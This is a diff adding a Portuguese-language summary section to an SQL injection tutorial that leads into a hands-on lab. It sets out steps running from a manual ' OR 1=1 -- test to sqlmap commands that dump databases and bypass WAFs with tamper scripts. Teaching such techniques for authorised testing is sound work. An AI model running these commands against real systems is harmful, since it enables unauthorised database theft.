@@ -167,6 +167,46 @@ Se o site tem WAF, você precisa adaptar seus ataques:
 
 ---
 
+### Resumo da ordem — Por que essa sequência?
+
+Injeção segue a ordem: **detectar → automatizar → explorar → extrair**.
+
+```
+PASSO 1: Testar manualmente → Confirmar que SQLi existe
+├── POR QUE: Automático pode dar falso positivo, manual confirma
+├── O QUE FAZER: Inserir ' OR 1=1 -- e ver se muda comportamento
+├── QUANDO AVANÇAR: Quando tiver certeza que há injeção
+└── SE DER ERRADO: Se não funcionar, tente aspas dupla, UNION, blind
+
+        ↓
+
+PASSO 2: SQLMap → Automatizar a exploração
+├── POR QUE: Manual é lento, SQLMap testa todos os tipos
+├── COMANDO: sqlmap -u "http://target.com/page?id=1" --batch
+├── QUANDO AVANÇAR: Quando SQLMap confirmar SQLi
+└── SE DER ERRADO: Se não detectar, aumente: --level=5 --risk=3
+
+        ↓
+
+PASSO 3: Extrair dados → Pegar informações do banco
+├── POR QUE: O objetivo é acessar dados sensiveis
+├── COMANDO: sqlmap -u "URL" --dbs --tables --dump
+├── QUANDO AVANÇAR: Quando tiver dados extraidos
+└── DICAS: Comece por banco 'mysql' ou 'information_schema'
+
+        ↓
+
+PASSO 4: WAF Bypass → Se tiver WAF bloqueando
+├── POR QUE: WAF pode bloquear payloads padrão
+├── COMANDO: sqlmap -u "URL" --tamper=space2comment,between
+├── QUANDO PARAR: Quando conseguir extrair dados
+└── DICAS: Teste um tamper por vez para qual funciona
+```
+
+**Dica:** Sempre teste SQLi manualmente antes de usar SQLMap — evita falsos positivos.
+
+---
+
 ## Lab Prático
 
 ### Exercício 1: SQL Injection com SQLMap
